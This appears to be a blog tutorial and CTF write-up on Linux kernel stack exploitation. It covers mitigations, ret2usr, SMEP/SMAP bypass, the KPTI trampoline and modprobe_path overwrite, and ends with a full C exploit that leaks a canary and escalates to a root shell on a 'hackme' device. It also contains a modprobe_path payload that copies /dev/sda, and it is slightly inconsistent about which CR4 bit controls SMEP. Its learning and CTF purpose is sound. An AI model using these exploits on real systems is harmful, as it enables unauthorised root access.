---
title: "Stack-based exploits in Linux kernel"
date: 2024-01-29
draft: false
tags: ["kernel", "pwn"]
showTableOfContents: true
---
{{< alert >}}
**Images not loading?** Try accessing this site using a VPN.
{{< /alert >}}

## Mitigations
### 1. SMEP
- dont allow to execute user space code
- in qemu, to enable SMEP we use `-cpu+smep`  to disasble it use `-append nosmep`
- SMEP is a hardware security mechanism. Setting the 21st bit of the CR4 register enables SMEP.

### 2. SMAP

- kernel space cannot read or write userspace memory
- to do that we need to use copy_from_user / copy_to_user

### 3. Kernel Canary

- the same as stack canary on user land
- enabled in the kernel at compile time and cannot be disabled.

### 4. KASLR

- randomizes the base address where the kernel is loaded each time the system is booted
- It can be enabled/disabled by adding `kaslr` or `nokaslr` under `-append` option.

### 5. KPTI (Kernel Page-Table Isolation)

- prevent Meltdown (side-channel attack)

### 6. KADR (Kernel Address Display Restriction)

- hide kernel address /proc/kallsyms
- `/proc/sys/kernel/kptr_restrict` : 0 to disable it

Kernel have sus function : `run_cmd(char * cmd)` : run cmd in userspace as root.

## Stack-base technique
### 1. ret2usr
This exploit take advantage of kernel space process can see userspace process → execute code in userspace with kernel permission (root) 

#### Requirements :

- SMEP must be off
- overflow must be possible
- ability to leak ( at least canary)

#### Ideas:

Overwrite return address of a kernel process to the process we can control in user space

##### Steps:

- save register state (`cs ,ss ,rsp,rflags`) in user space
- escalate privilege before return to user space (`commit_creds(prepare_kernel_cred(0))` )
- Return to user mode from kernel mode in kernel space + restore register state
- get shell

#### Details

##### Save registers state

The process keep track of 2 different states of register in kernel and user mode. Because we want to execute `system('/bin/sh')` in user mode so we need to restore user mode’s state 

These states should not random so before an access to kernel space process it must save states.

```c
unsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
```

##### Escalate privilege + switch to user mode + restore states

To escalate privilege, we simply use `commit_creds(prepare_kernel_cred(0))`

To switch to user mode, to process must use 1 of these : 

- `sysretq` : complicated to setup
- `iretq` : commonly use

`iretq`  require stack to setup with **5 userland register values** in this order: `RIP|CS|RFLAGS|SP|SS` → the value we save earlier

- for rip, we need to set it to the `get_shell()` address to get shell

On x86/64, `swapgs`  instruction must be call before `iretq`

Finally, we just push the save state register to stack

```c
unsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;
void leo_quyen()
{
	__asm__(
	".intel_syntax noprefix;"
	"movabs rax, 0xffffffff814c67f0;"
	"xor rdi, rdi;"
	"call rax;"
	"mov rdi,rax;"
	"movabs rax,0xffffffff814c6410;"
	"call rax;"
	"swapgs;"
    "mov r15, user_ss;"
    "push r15;"
    "mov r15, user_sp;"
    "push r15;"
    "mov r15, user_rflags;"
    "push r15;"
    "mov r15, user_cs;"
    "push r15;"
    "mov r15, user_rip;"
    "push r15;"
    "iretq;"
	".att_syntax;"
		);
}
```
### 2. Bypass SMEP/SMAP
SMEP mitigation is similar to NX in userland. SMEP enable by enable the 20th bit of CR4 register (start from 0) 

![image](https://hackmd.io/_uploads/SJow9EH9p.png)


#### a. Overwrite CR4 register

There is an api in kernel  `native_write_cr4(value)` 

→ ROPchain : pop rdi → `native_write_cr4()` → `prepare_kernel_cred()` → ….

We do that by zero out the 20th bit of CR4 register.

But in newer version of kernel , CR4 register cannot be change after boot by using pin. → If we change, it will set to the default boot value

#### b. ROPchain

Because we can’t execute code in user space , we can use gadget in kernel space. 

Note that these gadgets from ROPgadget not always works because it don’t known that memory area is executable or not → try and error
Also work with SMAP enable

##### Can overwrite more that return address

Just build a normal ROP chain to call `prepare_kernel_cred()`…

##### Can overwrite only return address (stack pivot)

Find a gadget that can mov some value to `rsp` , ex : *`mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret`*

In user space we mmap a region to build ROP chain.

This is possible due to SMAP is disable.

```basic
void build_fake_stack(void){
    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|M, -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0x0; // dummy r12
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = pop_rdi_ret;
    ... // the rest of the chain is the same as the last payload
}
```

Not work with SMAP

### 3. KPTI trampoline (KPTI bypass)
#### Bypass
2 way to bypass:
- using signal handler in userland
    `signal(SIGSEGV, get_shell)`
- KPTI trampoline
#### KPTI trampoline

kernel have a function : `swapgs_restore_regs_and_return_to_usermode()` to swap kernel page to user page

it will restore by pop a lots of regs in stack → ret2 `swapgs_restore_regs_and_return_to_usermode + 22`

![Untitledc77a1695b3efbfd4.png](https://img.upanh.tv/2024/01/29/Untitledc77a1695b3efbfd4.png)


`modprobe` is store under `modprobe_path` symbol in the linux kernel

It will invoke when these function is call in userland :

- system()
- execve()
- …

When we call `system(’/tmp/cc’)` and file signature of `cc` is unknown it will call `modprobe` 
Therefore, we have arbitrary command execution.
Note that we don’t need to use `commit_creds(prepare_kernel_cred(0))` → shorter ROP

### 4. modprobe_path
- Exploit kernel vuln to archive ROP in kernel space
- Find gadget to overwrite `modprobe_path`  in to new_path. Ex : `/tmp/cc`
- Return to user space
- Now we create that file in user space
    ```c
    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    ```
- Run that file
    ```c
    puts("[*] Run unknown file");
    system("/tmp/dummy");
    ```
    
## Debug + DEMO
### 1. Debug
First we need to set our kernel to have root → ez to debug (by extract cpio file
Second, remove some mitigations (typically in run.sh script provided by the challenge) → reads kernel symbol easier

Inside the qemu script add: 

```bash
-gdb tcp::1234
```

Write a [pack.sh](http://pack.sh) script :

```bash
#!/bin/sh
gcc -o exp -static exp.c
mv ./exp ./root
cd ./root
find . -print0 \
| cpio -o --format=newc  --null --owner=root  \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
```

- `exp.c` is the exploit i write in C.
- `./root` is the folder contain file system extract by the provided `initramfs.cpio.gz`

I also write a python script to automate the process of packing and running the kernel + debug
```python
from pwn import *
import os 

def debug():
	command = f"""target remote 127.0.0.1:1234
c
ksymaddr-remote-apply
c
	"""
	init = f"""#!/usr/bin/python3
import os
os.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', '-x', '/tmp/QEMU_debug.gdb'], os.environ)
	"""
	with open('/tmp/run_GDB','wt') as f:
		f.write(init)
	with open('/tmp/QEMU_debug.gdb', 'wt') as f:
		f.write(command)
	os.chmod("/tmp/run_GDB",stat.S_IRWXU)
	os.chmod("/tmp/QEMU_debug.gdb",stat.S_IRWXU)
	if (args.GDB):
		debug_process = process(['cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '-d', '.', 'wsl.exe', '-d', 'Ubuntu', 'bash', '-c', '/tmp/run_GDB'])

def start():
	os.system("./pack.sh")
	debug()
	os.system("./run.sh")

if __name__=="__main__": 
	start()
```

### 2. Demo ret2usr
[Challenge](https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz)

we need to modify the run.sh script
```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64\
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 nopti nokaslr quiet panic=1" \
    -gdb tcp::1234
```
We can read the stack freely on `hackme_read`

![Screenshot 2024-01-29 204256](https://hackmd.io/_uploads/ryiEcEr9p.png)
And stack buffer overflow on `hackme_write`

![Screenshot 2024-01-29 203824](https://hackmd.io/_uploads/rkTbcEB9p.png)


Base on this we can see the device name is `hackme`
![Screenshot 2024-01-29 204829](https://hackmd.io/_uploads/S1yX9NH9a.png)



First we need to open the device

```clike
void open_dev()
{
	device_fd = open(device_name,O_RDWR);
	if (device_fd < 0)
	{
		puts("[!] Cannot open device...\nExiting...");
		exit(-1);
	} else 
		puts("[*] Opened device");
}
```

To do ret2usr we must able to ROP -> leak canary

```clike
void leak_canary()
{
	unsigned long long leak[4] = {};
	read(device_fd,leak,sizeof(leak));
	canary = leak[2];
	printf("[*] CANARY : 0x%llx\n",canary);
}

```

Now we set breakpoint at 
![Screenshot 2024-01-29 205206](https://hackmd.io/_uploads/HJhtc4Hqp.png)

![Screenshot 2024-01-29 205351](https://hackmd.io/_uploads/H1Sc54B96.png)


It copy the what store at rsi to rdi with len 0x20

![Screenshot 2024-01-29 210119](https://hackmd.io/_uploads/SJTiKErqa.png)

At offset 2 is canary
![image](https://hackmd.io/_uploads/HklcF4rqT.png)


Now we can just find the offset to overflow the save rip in `hackme_write`
Note that smep is off so we can freely run userspace code in kernel space

```clike
void leo_quyen()
{
	__asm__(
	".intel_syntax noprefix;"
	"movabs rax, 0xffffffff814c67f0;"
	"xor rdi, rdi;"
	"call rax;"
	"mov rdi,rax;"
	"movabs rax,0xffffffff814c6410;"
	"call rax;"
	"swapgs;"
    "mov r15, user_ss;"
    "push r15;"
    "mov r15, user_sp;"
    "push r15;"
    "mov r15, user_rflags;"
    "push r15;"
    "mov r15, user_cs;"
    "push r15;"
    "mov r15, user_rip;"
    "push r15;"
    "iretq;"
	".att_syntax;"
		);
}

void overwrite()
{
	unsigned long long payload[21] = {};
	for (int i =0;i<=15;i++)
		payload[i] = 0x6161616161616161;
	payload[16] = canary ;
	payload[17] = 0;
	payload[18] = 0;
	payload[19] = 0;
	payload[20] = (unsigned long long )leo_quyen+8;
	if (write(device_fd,payload,sizeof(payload)) <0)
	{
		puts("[!] Cannot write to device...\nExiting...");
		exit(-1);
	}
	else
		puts("[*] Write successfully");

}
```
Before run that code we need to save registers state
```clike
void save_state()
{
	__asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
    );
    puts("[*] Saved state");
}
```

Before overflow
![Screenshot 2024-01-29 211949](https://hackmd.io/_uploads/HJbNFEH9T.png)


After overflow
![Screenshot 2024-01-29 212119](https://hackmd.io/_uploads/rJMXKVB9T.png)



- Final exp:
```clike
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>

#define device_name "/dev/hackme"
#define commit_creds 0xffffffffc000016a
#define prepare_kernel_cred 0xffffffff814c67f0

int device_fd ;
unsigned long long canary;

void open_dev()
{
	device_fd = open(device_name,O_RDWR);
	if (device_fd < 0)
	{
		puts("[!] Cannot open device...\nExiting...");
		exit(-1);
	} else 
		puts("[*] Opened device");
}


void leak_canary()
{
	unsigned long long leak[4] = {};
	read(device_fd,leak,sizeof(leak));
	canary = leak[2];
	printf("[*] CANARY : 0x%llx\n",canary);
}

void get_shell()
{
	if (getuid()==0)
	{
		puts("[!] Become ROOT");
		system("/bin/sh");
	}else
	{	
		puts("[*] Something wrong");
		exit;
	}
}

unsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;
void leo_quyen()
{
	__asm__(
	".intel_syntax noprefix;"
	"movabs rax, 0xffffffff814c67f0;"
	"xor rdi, rdi;"
	"call rax;"
	"mov rdi,rax;"
	"movabs rax,0xffffffff814c6410;"
	"call rax;"
	"swapgs;"
    "mov r15, user_ss;"
    "push r15;"
    "mov r15, user_sp;"
    "push r15;"
    "mov r15, user_rflags;"
    "push r15;"
    "mov r15, user_cs;"
    "push r15;"
    "mov r15, user_rip;"
    "push r15;"
    "iretq;"
	".att_syntax;"
		);
}

void overwrite()
{
	unsigned long long payload[21] = {};
	for (int i =0;i<=15;i++)
		payload[i] = 0x6161616161616161;
	payload[16] = canary ;
	payload[17] = 0;
	payload[18] = 0;
	payload[19] = 0;
	payload[20] = (unsigned long long )leo_quyen+8;
	if (write(device_fd,payload,sizeof(payload)) <0)
	{
		puts("[!] Cannot write to device...\nExiting...");
		exit(-1);
	}
	else
		puts("[*] Write successfully");

}

void save_state()
{
	__asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
    );
    puts("[*] Saved state");
}
int main()
{
	save_state();
	open_dev();
	leak_canary();
	overwrite();
	return 0 ;
}
```

## References:
- https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
- https://github.com/pr0cf5/kernel-exploit-practice/tree/master
- https://github.com/pr0cf5/kernel-exploit-practice/blob/master/bypass-smap/README.md